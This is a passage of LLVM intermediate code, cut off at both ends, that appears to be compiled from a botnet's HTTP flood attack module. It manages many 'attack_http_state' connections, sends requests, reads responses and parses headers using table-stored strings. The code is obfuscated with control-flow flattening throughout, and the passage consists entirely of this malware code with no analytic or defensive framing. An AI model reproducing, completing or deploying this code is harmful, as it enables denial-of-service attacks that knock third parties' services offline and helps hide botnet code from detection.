  %868 = call i32 @util_strlen(i8* %867)
  %869 = sext i32 %868 to i64
  %870 = getelementptr inbounds i8, i8* %866, i64 %869
  %871 = call i32 @util_strcpy(i8* %870, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  store i32 -1608476015, i32* %switchVar
  br label %loopEnd

; <label>:872:                                    ; preds = %loopEntry
  %873 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %874 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %875 = call i32 @util_strlen(i8* %874)
  %876 = sext i32 %875 to i64
  %877 = getelementptr inbounds i8, i8* %873, i64 %876
  %878 = call i32 @util_strcpy(i8* %877, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %879 = load i8*, i8** %14, align 8
  %880 = icmp ne i8* %879, null
  %881 = select i1 %880, i32 1807884844, i32 1030763109
  store i32 %881, i32* %switchVar
  br label %loopEnd

; <label>:882:                                    ; preds = %loopEntry
  %883 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %884 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %885 = call i32 @util_strlen(i8* %884)
  %886 = sext i32 %885 to i64
  %887 = getelementptr inbounds i8, i8* %883, i64 %886
  %888 = load i8*, i8** %14, align 8
  %889 = call i32 @util_strcpy(i8* %887, i8* %888)
  store i32 1030763109, i32* %switchVar
  br label %loopEnd

; <label>:890:                                    ; preds = %loopEntry
  %891 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %892 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %891, i32 0, i32 9
  %893 = getelementptr inbounds [9 x i8], [9 x i8]* %892, i32 0, i32 0
  %894 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %895 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %894, i32 0, i32 10
  %896 = getelementptr inbounds [9 x i8], [9 x i8]* %895, i32 0, i32 0
  %897 = call signext i8 @util_strcmp(i8* %893, i8* %896)
  %898 = icmp ne i8 %897, 0
  %899 = select i1 %898, i32 -1954237354, i32 477392526
  store i32 %899, i32* %switchVar
  br label %loopEnd

; <label>:900:                                    ; preds = %loopEntry
  %901 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %902 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %901, i32 0, i32 9
  %903 = getelementptr inbounds [9 x i8], [9 x i8]* %902, i32 0, i32 0
  %904 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %905 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %904, i32 0, i32 10
  %906 = getelementptr inbounds [9 x i8], [9 x i8]* %905, i32 0, i32 0
  %907 = call i32 @util_strcpy(i8* %903, i8* %906)
  store i32 -1954237354, i32* %switchVar
  br label %loopEnd

; <label>:908:                                    ; preds = %loopEntry
  %909 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %910 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %909, i32 0, i32 0
  %911 = load i32, i32* %910, align 4
  %912 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %913 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %914 = call i32 @util_strlen(i8* %913)
  %915 = sext i32 %914 to i64
  %916 = call i64 @send(i32 %911, i8* %912, i64 %915, i32 16384)
  %917 = load i32, i32* %27, align 4
  %918 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %919 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %918, i32 0, i32 3
  store i32 %917, i32* %919, align 4
  %920 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %921 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %920, i32 0, i32 1
  store i8 6, i8* %921, align 4
  %922 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %923 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %922, i32 0, i32 0
  %924 = load i32, i32* %923, align 4
  %925 = srem i32 %924, 64
  %926 = zext i32 %925 to i64
  %927 = shl i64 1, %926
  %928 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %929 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %930 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %929, i32 0, i32 0
  %931 = load i32, i32* %930, align 4
  %932 = sdiv i32 %931, 64
  %933 = sext i32 %932 to i64
  %934 = getelementptr inbounds [16 x i64], [16 x i64]* %928, i64 0, i64 %933
  %935 = load i64, i64* %934, align 8
  %936 = or i64 %935, %927
  store i64 %936, i64* %934, align 8
  %937 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %938 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %937, i32 0, i32 0
  %939 = load i32, i32* %938, align 4
  %940 = load i32, i32* %23, align 4
  %941 = icmp sgt i32 %939, %940
  %942 = select i1 %941, i32 425471257, i32 78011418
  store i32 %942, i32* %switchVar
  br label %loopEnd

; <label>:943:                                    ; preds = %loopEntry
  %944 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %945 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %944, i32 0, i32 0
  %946 = load i32, i32* %945, align 4
  %947 = add nsw i32 %946, 1
  store i32 %947, i32* %23, align 4
  store i32 78011418, i32* %switchVar
  br label %loopEnd

; <label>:948:                                    ; preds = %loopEntry
  store i32 587800721, i32* %switchVar
  br label %loopEnd

; <label>:949:                                    ; preds = %loopEntry
  %950 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %951 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %950, i32 0, i32 1
  %952 = load i8, i8* %951, align 4
  %953 = zext i8 %952 to i32
  %954 = icmp eq i32 %953, 6
  %955 = select i1 %954, i32 1636414855, i32 -1851685591
  store i32 %955, i32* %switchVar
  br label %loopEnd

; <label>:956:                                    ; preds = %loopEntry
  %957 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %958 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %957, i32 0, i32 0
  %959 = load i32, i32* %958, align 4
  %960 = srem i32 %959, 64
  %961 = zext i32 %960 to i64
  %962 = shl i64 1, %961
  %963 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %964 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %965 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %964, i32 0, i32 0
  %966 = load i32, i32* %965, align 4
  %967 = sdiv i32 %966, 64
  %968 = sext i32 %967 to i64
  %969 = getelementptr inbounds [16 x i64], [16 x i64]* %963, i64 0, i64 %968
  %970 = load i64, i64* %969, align 8
  %971 = or i64 %970, %962
  store i64 %971, i64* %969, align 8
  %972 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %973 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %972, i32 0, i32 0
  %974 = load i32, i32* %973, align 4
  %975 = load i32, i32* %23, align 4
  %976 = icmp sgt i32 %974, %975
  %977 = select i1 %976, i32 -574637008, i32 -531246593
  store i32 %977, i32* %switchVar
  br label %loopEnd

; <label>:978:                                    ; preds = %loopEntry
  %979 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %980 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %979, i32 0, i32 0
  %981 = load i32, i32* %980, align 4
  %982 = add nsw i32 %981, 1
  store i32 %982, i32* %23, align 4
  store i32 -531246593, i32* %switchVar
  br label %loopEnd

; <label>:983:                                    ; preds = %loopEntry
  store i32 -1505853824, i32* %switchVar
  br label %loopEnd

; <label>:984:                                    ; preds = %loopEntry
  %985 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %986 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %985, i32 0, i32 1
  %987 = load i8, i8* %986, align 4
  %988 = zext i8 %987 to i32
  %989 = icmp eq i32 %988, 7
  %990 = select i1 %989, i32 1473887670, i32 -26516296
  store i32 %990, i32* %switchVar
  br label %loopEnd

; <label>:991:                                    ; preds = %loopEntry
  %992 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %993 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %992, i32 0, i32 0
  %994 = load i32, i32* %993, align 4
  %995 = srem i32 %994, 64
  %996 = zext i32 %995 to i64
  %997 = shl i64 1, %996
  %998 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %999 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1000 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %999, i32 0, i32 0
  %1001 = load i32, i32* %1000, align 4
  %1002 = sdiv i32 %1001, 64
  %1003 = sext i32 %1002 to i64
  %1004 = getelementptr inbounds [16 x i64], [16 x i64]* %998, i64 0, i64 %1003
  %1005 = load i64, i64* %1004, align 8
  %1006 = or i64 %1005, %997
  store i64 %1006, i64* %1004, align 8
  %1007 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1008 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1007, i32 0, i32 0
  %1009 = load i32, i32* %1008, align 4
  %1010 = load i32, i32* %23, align 4
  %1011 = icmp sgt i32 %1009, %1010
  %1012 = select i1 %1011, i32 1650314151, i32 -60693503
  store i32 %1012, i32* %switchVar
  br label %loopEnd

; <label>:1013:                                   ; preds = %loopEntry
  %1014 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1015 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1014, i32 0, i32 0
  %1016 = load i32, i32* %1015, align 4
  %1017 = add nsw i32 %1016, 1
  store i32 %1017, i32* %23, align 4
  store i32 -60693503, i32* %switchVar
  br label %loopEnd

; <label>:1018:                                   ; preds = %loopEntry
  store i32 1157806718, i32* %switchVar
  br label %loopEnd

; <label>:1019:                                   ; preds = %loopEntry
  %1020 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1021 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1020, i32 0, i32 1
  %1022 = load i8, i8* %1021, align 4
  %1023 = zext i8 %1022 to i32
  %1024 = icmp eq i32 %1023, 10
  %1025 = select i1 %1024, i32 -1990291405, i32 167324197
  store i32 %1025, i32* %switchVar
  br label %loopEnd

; <label>:1026:                                   ; preds = %loopEntry
  %1027 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1028 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1027, i32 0, i32 0
  %1029 = load i32, i32* %1028, align 4
  %1030 = srem i32 %1029, 64
  %1031 = zext i32 %1030 to i64
  %1032 = shl i64 1, %1031
  %1033 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %1034 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1035 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1034, i32 0, i32 0
  %1036 = load i32, i32* %1035, align 4
  %1037 = sdiv i32 %1036, 64
  %1038 = sext i32 %1037 to i64
  %1039 = getelementptr inbounds [16 x i64], [16 x i64]* %1033, i64 0, i64 %1038
  %1040 = load i64, i64* %1039, align 8
  %1041 = or i64 %1040, %1032
  store i64 %1041, i64* %1039, align 8
  %1042 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1043 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1042, i32 0, i32 0
  %1044 = load i32, i32* %1043, align 4
  %1045 = load i32, i32* %23, align 4
  %1046 = icmp sgt i32 %1044, %1045
  %1047 = select i1 %1046, i32 -574990921, i32 -1183008652
  store i32 %1047, i32* %switchVar
  br label %loopEnd

; <label>:1048:                                   ; preds = %loopEntry
  %1049 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1050 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1049, i32 0, i32 0
  %1051 = load i32, i32* %1050, align 4
  %1052 = add nsw i32 %1051, 1
  store i32 %1052, i32* %23, align 4
  store i32 -1183008652, i32* %switchVar
  br label %loopEnd

; <label>:1053:                                   ; preds = %loopEntry
  store i32 447959639, i32* %switchVar
  br label %loopEnd

; <label>:1054:                                   ; preds = %loopEntry
  %1055 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1056 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1055, i32 0, i32 1
  %1057 = load i8, i8* %1056, align 4
  %1058 = zext i8 %1057 to i32
  %1059 = icmp eq i32 %1058, 11
  %1060 = select i1 %1059, i32 1062677434, i32 -1751089057
  store i32 %1060, i32* %switchVar
  br label %loopEnd

; <label>:1061:                                   ; preds = %loopEntry
  %1062 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1063 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1062, i32 0, i32 1
  store i8 0, i8* %1063, align 4
  %1064 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1065 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1064, i32 0, i32 0
  %1066 = load i32, i32* %1065, align 4
  %1067 = call i32 @close(i32 %1066)
  %1068 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1069 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1068, i32 0, i32 0
  store i32 -1, i32* %1069, align 4
  store i32 2146346787, i32* %switchVar
  br label %loopEnd

; <label>:1070:                                   ; preds = %loopEntry
  %1071 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1072 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1071, i32 0, i32 1
  store i8 0, i8* %1072, align 4
  %1073 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1074 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1073, i32 0, i32 0
  %1075 = load i32, i32* %1074, align 4
  %1076 = call i32 @close(i32 %1075)
  %1077 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1078 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1077, i32 0, i32 0
  store i32 -1, i32* %1078, align 4
  store i32 2146346787, i32* %switchVar
  br label %loopEnd

; <label>:1079:                                   ; preds = %loopEntry
  store i32 447959639, i32* %switchVar
  br label %loopEnd

; <label>:1080:                                   ; preds = %loopEntry
  store i32 1157806718, i32* %switchVar
  br label %loopEnd

; <label>:1081:                                   ; preds = %loopEntry
  store i32 -1505853824, i32* %switchVar
  br label %loopEnd

; <label>:1082:                                   ; preds = %loopEntry
  store i32 587800721, i32* %switchVar
  br label %loopEnd

; <label>:1083:                                   ; preds = %loopEntry
  store i32 1254906868, i32* %switchVar
  br label %loopEnd

; <label>:1084:                                   ; preds = %loopEntry
  store i32 2012520063, i32* %switchVar
  br label %loopEnd

; <label>:1085:                                   ; preds = %loopEntry
  store i32 885830589, i32* %switchVar
  br label %loopEnd

; <label>:1086:                                   ; preds = %loopEntry
  %1087 = load i32, i32* %9, align 4
  %1088 = add nsw i32 %1087, 1
  store i32 %1088, i32* %9, align 4
  store i32 -1407325290, i32* %switchVar
  br label %loopEnd

; <label>:1089:                                   ; preds = %loopEntry
  %1090 = load i32, i32* %23, align 4
  %1091 = icmp eq i32 %1090, 0
  %1092 = select i1 %1091, i32 -271072904, i32 134607622
  store i32 %1092, i32* %switchVar
  br label %loopEnd

; <label>:1093:                                   ; preds = %loopEntry
  store i32 2993932, i32* %switchVar
  br label %loopEnd

; <label>:1094:                                   ; preds = %loopEntry
  %1095 = getelementptr inbounds %struct.timeval, %struct.timeval* %25, i32 0, i32 1
  store i64 0, i64* %1095, align 8
  %1096 = getelementptr inbounds %struct.timeval, %struct.timeval* %25, i32 0, i32 0
  store i64 1, i64* %1096, align 8
  %1097 = load i32, i32* %23, align 4
  %1098 = call i32 @select(i32 %1097, %struct.fd_set* %21, %struct.fd_set* %22, %struct.fd_set* null, %struct.timeval* %25)
  store i32 %1098, i32* %24, align 4
  %1099 = call i64 @time(i64* null) #6
  %1100 = trunc i64 %1099 to i32
  store i32 %1100, i32* %27, align 4
  %1101 = load i32, i32* %24, align 4
  %1102 = icmp slt i32 %1101, 1
  %1103 = select i1 %1102, i32 -793298253, i32 2139135023
  store i32 %1103, i32* %switchVar
  br label %loopEnd

; <label>:1104:                                   ; preds = %loopEntry
  store i32 2993932, i32* %switchVar
  br label %loopEnd

; <label>:1105:                                   ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 2015148112, i32* %switchVar
  br label %loopEnd

; <label>:1106:                                   ; preds = %loopEntry
  %1107 = load i32, i32* %9, align 4
  %1108 = load i32, i32* %18, align 4
  %1109 = icmp slt i32 %1107, %1108
  %1110 = select i1 %1109, i32 -129172463, i32 -1395399066
  store i32 %1110, i32* %switchVar
  br label %loopEnd

; <label>:1111:                                   ; preds = %loopEntry
  %1112 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %1113 = load i32, i32* %9, align 4
  %1114 = sext i32 %1113 to i64
  %1115 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1112, i64 %1114
  store %struct.attack_http_state* %1115, %struct.attack_http_state** %26, align 8
  %1116 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1117 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1116, i32 0, i32 0
  %1118 = load i32, i32* %1117, align 4
  %1119 = icmp eq i32 %1118, -1
  %1120 = select i1 %1119, i32 -1469266151, i32 -2128584897
  store i32 %1120, i32* %switchVar
  br label %loopEnd

; <label>:1121:                                   ; preds = %loopEntry
  store i32 1925317065, i32* %switchVar
  br label %loopEnd

; <label>:1122:                                   ; preds = %loopEntry
  %1123 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %1124 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1125 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1124, i32 0, i32 0
  %1126 = load i32, i32* %1125, align 4
  %1127 = sdiv i32 %1126, 64
  %1128 = sext i32 %1127 to i64
  %1129 = getelementptr inbounds [16 x i64], [16 x i64]* %1123, i64 0, i64 %1128
  %1130 = load i64, i64* %1129, align 8
  %1131 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1132 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1131, i32 0, i32 0
  %1133 = load i32, i32* %1132, align 4
  %1134 = srem i32 %1133, 64
  %1135 = zext i32 %1134 to i64
  %1136 = shl i64 1, %1135
  %1137 = and i64 %1130, %1136
  %1138 = icmp ne i64 %1137, 0
  %1139 = select i1 %1138, i32 -439276081, i32 -7445204
  store i32 %1139, i32* %switchVar
  br label %loopEnd

; <label>:1140:                                   ; preds = %loopEntry
  store i32 0, i32* %35, align 4
  store i32 4, i32* %36, align 4
  %1141 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1142 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1141, i32 0, i32 0
  %1143 = load i32, i32* %1142, align 4
  %1144 = bitcast i32* %35 to i8*
  %1145 = call i32 @getsockopt(i32 %1143, i32 1, i32 4, i8* %1144, i32* %36) #6
  store i32 %1145, i32* %12, align 4
  %1146 = load i32, i32* %35, align 4
  %1147 = icmp eq i32 %1146, 0
  %1148 = select i1 %1147, i32 -1699126214, i32 -776972979
  store i32 %1148, i32* %switchVar
  br label %loopEnd

; <label>:1149:                                   ; preds = %loopEntry
  %1150 = load i32, i32* %12, align 4
  %1151 = icmp eq i32 %1150, 0
  %1152 = select i1 %1151, i32 647164499, i32 -776972979
  store i32 %1152, i32* %switchVar
  br label %loopEnd

; <label>:1153:                                   ; preds = %loopEntry
  %1154 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1155 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1154, i32 0, i32 1
  store i8 4, i8* %1155, align 4
  store i32 1012044965, i32* %switchVar
  br label %loopEnd

; <label>:1156:                                   ; preds = %loopEntry
  %1157 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1158 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1157, i32 0, i32 0
  %1159 = load i32, i32* %1158, align 4
  %1160 = call i32 @close(i32 %1159)
  %1161 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1162 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1161, i32 0, i32 0
  store i32 -1, i32* %1162, align 4
  %1163 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1164 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1163, i32 0, i32 1
  store i8 0, i8* %1164, align 4
  store i32 1925317065, i32* %switchVar
  br label %loopEnd

; <label>:1165:                                   ; preds = %loopEntry
  store i32 -7445204, i32* %switchVar
  br label %loopEnd

; <label>:1166:                                   ; preds = %loopEntry
  %1167 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %1168 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1169 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1168, i32 0, i32 0
  %1170 = load i32, i32* %1169, align 4
  %1171 = sdiv i32 %1170, 64
  %1172 = sext i32 %1171 to i64
  %1173 = getelementptr inbounds [16 x i64], [16 x i64]* %1167, i64 0, i64 %1172
  %1174 = load i64, i64* %1173, align 8
  %1175 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1176 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1175, i32 0, i32 0
  %1177 = load i32, i32* %1176, align 4
  %1178 = srem i32 %1177, 64
  %1179 = zext i32 %1178 to i64
  %1180 = shl i64 1, %1179
  %1181 = and i64 %1174, %1180
  %1182 = icmp ne i64 %1181, 0
  %1183 = select i1 %1182, i32 -925555879, i32 1691909124
  store i32 %1183, i32* %switchVar
  br label %loopEnd

; <label>:1184:                                   ; preds = %loopEntry
  %1185 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1186 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1185, i32 0, i32 1
  %1187 = load i8, i8* %1186, align 4
  %1188 = zext i8 %1187 to i32
  %1189 = icmp eq i32 %1188, 6
  %1190 = select i1 %1189, i32 -82368839, i32 671758328
  store i32 %1190, i32* %switchVar
  br label %loopEnd

; <label>:1191:                                   ; preds = %loopEntry
  store i32 0, i32* %37, align 4
  %1192 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  call void @util_zero(i8* %1192, i32 10240)
  %1193 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1194 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1193, i32 0, i32 0
  %1195 = load i32, i32* %1194, align 4
  %1196 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1197 = call i64 @recv(i32 %1195, i8* %1196, i64 10240, i32 16386)
  %1198 = trunc i64 %1197 to i32
  store i32 %1198, i32* %12, align 4
  %1199 = icmp slt i32 %1198, 1
  %1200 = select i1 %1199, i32 889647973, i32 -1128624123
  store i32 %1200, i32* %switchVar
  br label %loopEnd

; <label>:1201:                                   ; preds = %loopEntry
  %1202 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1203 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1202, i32 0, i32 0
  %1204 = load i32, i32* %1203, align 4
  %1205 = call i32 @close(i32 %1204)
  %1206 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1207 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1206, i32 0, i32 0
  store i32 -1, i32* %1207, align 4
  %1208 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1209 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1208, i32 0, i32 1
  store i8 0, i8* %1209, align 4
  store i32 1925317065, i32* %switchVar
  br label %loopEnd

; <label>:1210:                                   ; preds = %loopEntry
  %1211 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1212 = load i32, i32* %12, align 4
  %1213 = call i32 @util_memsearch(i8* %1211, i32 %1212, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 4)
  %1214 = icmp eq i32 %1213, -1
  %1215 = select i1 %1214, i32 -1980634786, i32 -1654923939
  store i32 %1215, i32* %switchVar
  br label %loopEnd

; <label>:1216:                                   ; preds = %loopEntry
  %1217 = load i32, i32* %12, align 4
  %1218 = icmp slt i32 %1217, 10240
  %1219 = select i1 %1218, i32 -1053897090, i32 -1654923939
  store i32 %1219, i32* %switchVar
  br label %loopEnd

; <label>:1220:                                   ; preds = %loopEntry
  store i32 1925317065, i32* %switchVar
  br label %loopEnd

; <label>:1221:                                   ; preds = %loopEntry
  %1222 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1223 = load i32, i32* %12, align 4
  %1224 = call i32 @util_memsearch(i8* %1222, i32 %1223, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 4)
  %1225 = sext i32 %1224 to i64
  %1226 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1225
  store i8 0, i8* %1226, align 1
  %1227 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1228 = load i32, i32* %12, align 4
  %1229 = call i8* @table_retrieve_val(i32 71, i32* null)
  %1230 = call i32 @util_stristr(i8* %1227, i32 %1228, i8* %1229)
  %1231 = icmp ne i32 %1230, -1
  %1232 = select i1 %1231, i32 1103737214, i32 1259164242
  store i32 %1232, i32* %switchVar
  br label %loopEnd

; <label>:1233:                                   ; preds = %loopEntry
  %1234 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1235 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1234, i32 0, i32 11
  store i32 2, i32* %1235, align 4
  store i32 1259164242, i32* %switchVar
  br label %loopEnd

; <label>:1236:                                   ; preds = %loopEntry
  %1237 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1238 = load i32, i32* %12, align 4
  %1239 = call i8* @table_retrieve_val(i32 70, i32* null)
  %1240 = call i32 @util_stristr(i8* %1237, i32 %1238, i8* %1239)
  %1241 = icmp ne i32 %1240, -1
  %1242 = select i1 %1241, i32 -1215820179, i32 -1202211410
  store i32 %1242, i32* %switchVar
  br label %loopEnd

; <label>:1243:                                   ; preds = %loopEntry
  %1244 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1245 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1244, i32 0, i32 11
  store i32 1, i32* %1245, align 4
  store i32 -1202211410, i32* %switchVar
  br label %loopEnd

; <label>:1246:                                   ; preds = %loopEntry
  %1247 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1248 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1247, i32 0, i32 12
  store i32 0, i32* %1248, align 4
  %1249 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1250 = load i32, i32* %12, align 4
  %1251 = call i8* @table_retrieve_val(i32 69, i32* null)
  %1252 = call i32 @util_stristr(i8* %1249, i32 %1250, i8* %1251)
  %1253 = icmp ne i32 %1252, -1
  %1254 = select i1 %1253, i32 -529159214, i32 690243138
  store i32 %1254, i32* %switchVar
  br label %loopEnd

; <label>:1255:                                   ; preds = %loopEntry
  %1256 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1257 = load i32, i32* %12, align 4
  %1258 = call i8* @table_retrieve_val(i32 69, i32* null)
  %1259 = call i32 @util_stristr(i8* %1256, i32 %1257, i8* %1258)
  store i32 %1259, i32* %38, align 4
  %1260 = load i32, i32* %38, align 4
  %1261 = sext i32 %1260 to i64
  %1262 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1261
  %1263 = load i8, i8* %1262, align 1
  %1264 = sext i8 %1263 to i32
  %1265 = icmp eq i32 %1264, 32
  %1266 = select i1 %1265, i32 97132968, i32 71731235
  store i32 %1266, i32* %switchVar
  br label %loopEnd

; <label>:1267:                                   ; preds = %loopEntry
  %1268 = load i32, i32* %38, align 4
  %1269 = add nsw i32 %1268, 1
  store i32 %1269, i32* %38, align 4
  store i32 71731235, i32* %switchVar
  br label %loopEnd

; <label>:1270:                                   ; preds = %loopEntry
  %1271 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1272 = load i32, i32* %38, align 4
  %1273 = sext i32 %1272 to i64
  %1274 = getelementptr inbounds i8, i8* %1271, i64 %1273
  %1275 = load i32, i32* %12, align 4
  %1276 = load i32, i32* %38, align 4
  %1277 = sub nsw i32 %1275, %1276
  %1278 = call i32 @util_memsearch(i8* %1274, i32 %1277, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1278, i32* %39, align 4
  %1279 = load i32, i32* %39, align 4
  %1280 = icmp ne i32 %1279, -1
  %1281 = select i1 %1280, i32 -733354775, i32 -747713480
  store i32 %1281, i32* %switchVar
  br label %loopEnd

; <label>:1282:                                   ; preds = %loopEntry
